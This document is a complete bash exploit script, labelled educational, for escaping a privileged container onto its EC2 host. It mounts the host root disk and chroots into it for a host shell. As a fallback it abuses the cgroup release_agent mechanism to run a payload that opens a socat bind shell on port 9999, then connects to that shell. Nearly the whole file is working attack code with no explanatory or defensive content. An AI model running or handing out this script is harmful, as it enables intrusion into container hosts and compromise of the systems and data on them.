
# Container Escape Exploit Script - Simplified Version
# For educational purposes only
# 
# UNIX COMPATIBILITY NOTES:
# 1. Ensure this script has Unix line endings (LF, not CRLF)
#    If transferred from Windows, run: sed -i 's/\r$//' container_escape_shell.sh
# 2. Make the script executable: chmod +x container_escape_shell.sh
# 3. Run with: ./container_escape_shell.sh
#
# This script requires a privileged container to work properly

echo "[*] Container Escape Exploit - Simplified Shell Access"
echo "[*] This script provides direct shell access to the EC2 host"

# Check if running in a privileged container
echo "[*] Checking for privileged status..."
if [ ! -f /proc/self/status ]; then
    echo "[-] Cannot access /proc/self/status. Are you in a container?"
    exit 1
fi

cap_eff=$(grep CapEff /proc/self/status | awk '{print $2}')
echo "[*] Container capability set: $cap_eff"

# More lenient check - this container seems to have high capabilities even if not the exact pattern
if [[ "$cap_eff" == *"ffffffff"* ]]; then
    echo "[+] Container appears to have high capabilities. Proceeding with exploit..."
else
    echo "[-] This container does not appear to have sufficient capabilities."
    echo "[-] Expected a capability set ending with ffffffff"
    exit 1
fi

# Method 1: Mount the host filesystem
echo "[*] Attempting to access host filesystem via disk device..."
echo "[*] Creating mount point at /tmp/host_root"
mkdir -p /tmp/host_root

# Try to automatically identify a suitable disk device
echo "[*] Attempting to automatically identify a suitable disk device..."
potential_devices=$(find /dev -name "xvda*" -o -name "sda*" -o -name "vda*" -o -name "nvme*" 2>/dev/null)

if [ -n "$potential_devices" ]; then
    echo "[+] Found potential disk devices:"
    echo "$potential_devices"
    
    # Try to find the root partition
    for device in $potential_devices; do
        if [[ "$device" == *"1" ]] || [[ "$device" == *"p1" ]]; then
            echo "[*] Found likely root partition: $device"
            suggested_device="$device"
            break
        fi
    done
else
    echo "[*] No common disk devices found automatically."
    # Check if / is mounted from a device we can identify
    root_dev=$(df / | tail -1 | awk '{print $1}')
    if [[ "$root_dev" == /dev/* ]]; then
        echo "[*] Found root device: $root_dev"
        suggested_device="$root_dev"
    fi
fi

# Use the suggested device or ask for input
if [ -n "$suggested_device" ]; then
    echo "[*] Using disk device: $suggested_device"
    disk_device="$suggested_device"
else
    echo "[*] Enter the main host disk device to mount (e.g., /dev/xvda1, /dev/sda1):"
    read disk_device
fi

# Try to mount the host filesystem
if [ ! -b "$disk_device" ]; then
    echo "[-] Invalid disk device: $disk_device"
    echo "[*] Trying alternative method..."
else
    echo "[*] Attempting to mount $disk_device to /tmp/host_root"
    if mount "$disk_device" /tmp/host_root; then
        echo "[+] Successfully mounted host filesystem!"
        echo "[+] Host filesystem is accessible at /tmp/host_root"
        echo "[*] Starting shell on host filesystem..."
        echo "[*] Type 'exit' to return to the container shell"
        echo "----------------------------------------"
        chroot /tmp/host_root /bin/bash
        echo "----------------------------------------"
        echo "[*] Returned to container shell"
        exit 0
    else
        echo "[-] Failed to mount host filesystem. Trying alternative method..."
    fi
fi

# Method 2: Using cgroups Release Agent (simplified)
echo "[*] Attempting cgroups Release Agent method..."
mkdir -p /tmp/escape

# Try multiple cgroup subsystems
for subsystem in rdma memory cpu devices freezer net_cls; do
    echo "[*] Trying to mount cgroup with $subsystem subsystem..."
    if mount -t cgroup -o $subsystem cgroup /tmp/escape 2>/dev/null; then
        echo "[+] Successfully mounted cgroup filesystem using $subsystem subsystem"
        break
    fi
done

# If specific subsystems didn't work, try without specifying a subsystem
if ! mountpoint -q /tmp/escape; then
    echo "[*] Trying to mount cgroup without specifying a subsystem..."
    mount -t cgroup cgroup /tmp/escape 2>/dev/null
fi

# Check if mount was successful
if ! mountpoint -q /tmp/escape; then
    echo "[-] Could not mount cgroup filesystem. Failed to escape."
    exit 1
fi

# Determine the correct directory structure
if [ -f /tmp/escape/release_agent ]; then
    work_dir="/tmp/escape"
else
    mkdir -p /tmp/escape/x
    work_dir="/tmp/escape/x"
fi

# Enable notify_on_release
echo 1 > $work_dir/notify_on_release

# Determine the release_agent path
if [ -f $work_dir/release_agent ]; then
    host_path=$work_dir/release_agent
else
    host_path="/tmp/escape/release_agent"
fi

# Create a simple payload that just gives us a shell
cat > /tmp/payload.sh << 'EOF'
#!/bin/bash
# Create a simple bind shell on port 9999
nohup bash -c "socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane" > /dev/null 2>&1 &
echo "Shell started on port 9999" > /tmp/shell_started.txt
chmod 666 /tmp/shell_started.txt
EOF

# Make payload executable
chmod +x /tmp/payload.sh

# Setup release_agent to execute our payload
echo "[*] Setting up release_agent to execute our payload"
echo "/tmp/payload.sh" > $host_path
chmod +x $host_path

# Trigger the exploit
echo "[*] Triggering the exploit..."
echo $$ > $work_dir/cgroup.procs 2>/dev/null || echo $$ > $work_dir/tasks 2>/dev/null

# Wait for the shell to start
echo "[*] Waiting for shell to start..."
for i in {1..5}; do
    if [ -f /tmp/shell_started.txt ]; then
        echo "[+] Shell started on port 9999"
        break
    fi
    echo -n "."
    sleep 1
done

# Connect to the shell
echo "[*] Connecting to shell..."
echo "[*] Press Ctrl+C to exit the shell"
echo "----------------------------------------"
socat - TCP:127.0.0.1:9999 || nc 127.0.0.1 9999

echo "[*] Exploit complete." 